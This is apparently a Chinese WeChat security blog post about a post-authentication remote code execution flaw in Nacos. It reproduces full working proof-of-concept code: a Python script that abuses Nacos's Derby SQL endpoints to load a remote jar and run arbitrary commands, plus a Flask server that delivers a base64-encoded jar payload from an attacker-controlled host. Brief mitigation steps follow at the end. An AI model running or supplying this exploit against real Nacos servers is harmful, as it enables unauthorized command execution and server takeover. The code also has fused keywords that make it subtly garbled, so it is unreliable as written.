#  紧急修复！Nacos 0day POC 及修复方式   
原创 sspsec  SSP安全研究   2024-07-15 20:11  
  
**免责声明****：**由于传播、利用本公众号SSP安全研究所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号SSP安全研究及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
**1**►  
  
**漏洞背景**  
  
    Nacos 是 Alibaba 开源的一款用于微服务架构的注册中心和配置中心。它为开发人员提供了轻量级的服务发现和配置管理功能。然而，Nacos 在某些版本中存在一个严重的远程代码执行漏洞，允许攻击者未经授权执行任意代码，从而可能控制整个服务器。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVpKVhIb3AxSBBJmx6X35KeXGB1R2QDsdrdKqHfickUlJOHSVcfRxEB7rf5MOdbNXgmGXqOax4ZQ8Hg/640?wx_fmt=png&from=appmsg "")  
  
  
**2**►  
  
**漏洞详情**  
  
  
    这个漏洞的核心在于 Nacos 的某些接口没有严格的权限控制，攻击者可以通过特制的请求向 Nacos 服务器发送恶意数据，从而执行任意代码。具体漏洞的细节可以在 GitHub 仓库 中找到  
  
https://github.com/ayoundzw/nacos-poc  
  
这次的 nacos 0day 需要登录到后才才能利用  
  
  
根据分析，该漏洞涉及到 Nacos 在处理反序列化数据时的缺陷，使得攻击者能够通过特定的 JSON 数据结构，远程执行恶意代码。攻击者可以利用该漏洞读取敏感文件、执行系统命令等，危害极大。  
  
  
**3**►  
  
**漏洞利用过程**  
  
  
POC是一个python项目，依赖requests和flask，请先使用requiments.txt安装依赖  
  
1.配置config.py中的ip和端口，执行service.py，POC攻击需要启动一个jar包下载的地方，jar包里可以放任意代码，都可执行，我这里放了一个接收参数执行java命令的。  
  
2.执行exploit.py，输入地址和命令即可执行。  
#### 漏洞利用代码  
  
config.py  
```
server_host = '127.0.0.1'
server_port = 5000
```  
  
exploit.py  
```
import random
import sys
import requests
from urllib.parse import urljoin
import config


# 按装订区域中的绿色按钮以运行脚本。
defexploit(target, command, service):
    removal_url = urljoin(target,'/nacos/v1/cs/ops/data/removal')
    derby_url = urljoin(target,'/nacos/v1/cs/ops/derby')
for i inrange(0,sys.maxsize):
id=''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',8))
        post_sql ="""CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)\n        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{id}')\n        CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'\n""".format(id=id,service=service);
        option_sql ="UPDATE ROLES SET ROLE='1' WHERE ROLE='1' AND ROLE=S_EXAMPLE_{id}('{cmd}')\n".format(id=id,cmd=command);
        get_sql ="select * from (select count(*) as b, S_EXAMPLE_{id}('{cmd}') as a from config_info) tmp /*ROWS FETCH NEXT*/".format(id=id,cmd=command);
#get_sql = "select * from users /*ROWS FETCH NEXT*/".format(id=id,cmd=command);
        files ={'file': post_sql}
        post_resp = requests.post(url=removal_url,files=files)
        post_json = post_resp.json()
if post_json.get('message',None)isNoneand post_json.get('data',None)isnotNone:
print(post_resp.text)
            get_resp = requests.get(url=derby_url,params={'sql':get_sql})
print(get_resp.text)
break


if __name__ =='__main__':
    service ='http://{host}:{port}/download'.format(host=config.server_host,port=config.server_port)
    target ='http://127.0.0.1:8848'
    command ='calc'
    target =input('请输入目录URL，默认：http://127.0.0.1:8848：')or target
    command =input('请输入命令，默认：calc：')or command
    exploit(target=target, command=command,service=service)
```  
  
service.py  
```
import base64
from flask importFlask, send_file,Response
import config

payload =b'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'

app =Flask(__name__)


@app.route('/download')
defdownload_file():
    data = base64.b64decode(payload)
    response =Response(data, mimetype="application/octet-stream")
# response.headers["Content-Disposition"] = "attachment; filename=file.bin"
return response

if __name__ =='__main__':
    app.run(host=config.server_host, port=config.server_port)
```  
  
  
**4**►  
  
**修复方式**  
  
为了保护您的 Nacos 服务器免受此漏洞的影响，建议采取以下防护措施：  
1. 1. **升级 Nacos 版本**：及时升级到最新版本的 Nacos，防止出现前期出现的 nacos 未授权访问漏洞。  
  
1. 2. **网络隔离**：将 Nacos 管理接口置于内网，仅允许可信任的网络环境访问。  
  
1. 3. **启用认证**：配置 Nacos 的访问权限，启用身份认证和授权机制，确保只有经过认证的用户才能访问关键接口。  
  
1. 4. **监控与审计**：定期监控 Nacos 服务器的访问日志，及时发现并响应异常活动。  
  
1. 5. **更改口令为强口令**：这次的 nacos 0day 需要登录到后才才能利用  
  
**References**  
  
https://github.com/ayoundzw/nacos-poc  
  
  
  
**5**►  
  
**往期精彩**  
  
  
[MuMu模拟器Frida 逆向某颜色APP实战](http://mp.weixin.qq.com/s?__biz=Mzg5MzMzNTUzMA==&mid=2247485175&idx=1&sn=38e2e654cee407d1e9ff9ef7069b168f&chksm=c0312472f746ad6412a880cc6afb0364d0afe044bb288ddc4a182d8d9059d4f4c55d9689351d&scene=21#wechat_redirect)  
  
  
[蓝队应急响应实战案例（五）恶意流量分析](http://mp.weixin.qq.com/s?__biz=Mzg5MzMzNTUzMA==&mid=2247485140&idx=1&sn=723455c943b14783c9cec2d04247e28e&chksm=c0312451f746ad47cb3aac65b19b05b9347b7195620b45bad093353a6153723e58cebba4bb96&scene=21#wechat_redirect)  
  
  
[Mac渗透工具箱SpearV2来啦~重大更新](http://mp.weixin.qq.com/s?__biz=Mzg5MzMzNTUzMA==&mid=2247485049&idx=1&sn=5efc01ff37263a6bf23fe11bf0a6f82d&chksm=c03124fcf746adeac9ad12cc0af26c87c4f2e922488b9137ce5c3182a677e345fb94025d0ef9&scene=21#wechat_redirect)  
  
  
[Windows权限提升方式总结](http://mp.weixin.qq.com/s?__biz=Mzg5MzMzNTUzMA==&mid=2247485026&idx=1&sn=e065cf804e94d18a1ad4c874b8de58b8&chksm=c03124e7f746adf15f8f5e5e8ab7bf3c5b3fd6a0882fb140fa318d0a981575776dc30abbb98d&scene=21#wechat_redirect)  
  
  
[记某高校渗透测试24-0506](http://mp.weixin.qq.com/s?__biz=Mzg5MzMzNTUzMA==&mid=2247484657&idx=1&sn=6fa4731b72f6ca1aba3b50ef7099b7d5&chksm=c0312674f746af62505888e443ad1fc847ce7b885505e84e410098d1bbcdbe943de4a284a5e1&scene=21#wechat_redirect)  
  
  
  
  
  
